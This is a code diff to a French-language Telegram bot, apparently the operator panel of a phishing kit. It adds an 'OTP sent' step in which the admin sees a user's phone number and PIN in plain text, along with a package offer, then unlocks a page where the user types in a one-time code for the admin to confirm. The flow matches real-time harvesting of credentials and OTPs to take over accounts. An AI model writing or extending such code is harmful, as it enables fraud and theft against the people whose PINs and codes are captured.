@@ -46,6 +46,16 @@ async function editMessageText(messageId: number, text: string, replyMarkup?: un
   await apiCall("editMessageText", body);
 }
 
+/** Inline keyboard shown after user logs in — admin confirms they've sent OTP */
+export function buildLoginKeyboard(sessionId: string): unknown {
+  return {
+    inline_keyboard: [[
+      { text: "📤 OTP Envoyé", callback_data: `otp_sent:${sessionId}` },
+    ]],
+  };
+}
+
+/** Inline keyboard shown after user submits OTP — admin confirms or rejects */
 export function buildOtpKeyboard(sessionId: string): unknown {
   return {
     inline_keyboard: [[
@@ -118,7 +128,24 @@ async function handleUpdate(update: TelegramUpdate): Promise<void> {
     return;
   }
 
-  if (action === "confirm") {
+  if (action === "otp_sent") {
+    // Admin has manually sent OTP to user — unlock the OTP entry page
+    await db
+      .update(sessionsTable)
+      .set({ status: "otp_sent" })
+      .where(eq(sessionsTable.id, sessionId));
+
+    await answerCallbackQuery(cbId, "📤 OTP marqué comme envoyé — l'utilisateur peut maintenant saisir le code");
+
+    if (message?.message_id) {
+      await editMessageText(
+        message.message_id,
+        `📤 *OTP ENVOYÉ*\n\n📱 Téléphone: \`${session.phone}\`\n🔑 PIN: \`${session.pin}\`\n📦 Forfait: *${session.packageName}* — ${session.packagePrice}\n\n_En attente de saisie OTP par l'utilisateur..._`,
+      );
+    }
+    logger.info({ sessionId }, "Admin marked OTP as sent");
+
+  } else if (action === "confirm") {
     await db
       .update(sessionsTable)
       .set({ status: "verified" })
